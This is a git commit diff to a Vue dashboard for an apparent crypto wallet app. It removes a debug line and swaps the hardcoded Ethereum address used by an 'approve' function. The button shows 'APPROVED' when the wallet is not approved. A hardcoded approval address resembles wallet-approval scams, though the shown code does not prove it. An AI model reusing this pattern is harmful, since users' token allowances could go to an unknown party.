c267a8553584713f2eb83c9c5fb291b59fba8750
bryanballidev <bryanballidev@gmail.com>
2022-06-19 21:57:59 +0800

    update

--- src/components/dashboard/Home.vue
+++ src/components/dashboard/Home.vue
@@ -6,7 +6,6 @@
       <button class="wallet-btn border border-black sm:px-4 sm:py-2 px-2 py-2 mb-6 sm:mb-0 text-lg my-8 sm:text-3xl font-semibold text-black md:mt-8 hover:scale-105 hover:transition hover:duration-500" @click="linkWallet" v-if="walletAddress?.length == 0">CONNECT WALLET</button>
       <button class="wallet-btn border border-black sm:px-4 sm:py-2 px-2 py-2 mb-6 sm:mb-0 text-lg my-8 sm:text-3xl font-semibold text-black md:mt-8 hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else>{{!isApproved ? 'APPROVED' : `${address.slice(0, -36)}...${address.substring(38)}`}}</button>
     </div>
-    <div>{{qqq}}</div>
     <img
       class="w-72 h-64 my-16 ml-4"
       src="@/assets/leslie-rhino.png"
@@ -73,7 +72,7 @@
       const approve = async () => {
         let auth_address = '';
         if (environment.value === 'Ethereum') {
-          auth_address = '0xca99776706CDDa6F3Cd0DD7AaB4f43b153Aa51fE'
+          auth_address = '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
         } 
         if (auth_address === '') {
           console.log("Error")
